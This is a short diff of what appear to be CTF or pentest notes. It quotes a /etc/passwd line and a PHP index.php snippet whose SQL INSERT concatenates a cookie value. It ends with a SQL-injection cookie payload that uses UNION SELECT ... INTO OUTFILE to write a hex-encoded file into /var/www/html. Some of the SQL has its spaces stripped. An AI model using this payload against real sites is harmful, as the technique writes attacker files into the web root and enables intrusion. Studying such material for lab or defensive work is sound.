@@ -51,14 +51,14 @@ dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
 
 LOAD index.php
 
-require_once"config.php";
+	require_once"config.php";
 
-if(!isset($_COOKIE["id"])){
-$cookie=bin2hex(random_bytes(16));
-$queueNum=rand(1,100);
-setcookie("id",$cookie,NULL,"/");
+	if(!isset($_COOKIE["id"])){
+	$cookie=bin2hex(random_bytes(16));
+	$queueNum=rand(1,100);
+	setcookie("id",$cookie,NULL,"/");
 
-$sql="INSERTINTOqueueVALUES('".$cookie."',".
+	$sql="INSERTINTOqueueVALUES('".$cookie."',".
 
 UPLOAD FILES in HEX
 Cookie:id='unionselect1,0x48656c6c6f20776f726c640aINTOOUTFILE'/var/www/html/test.php'---
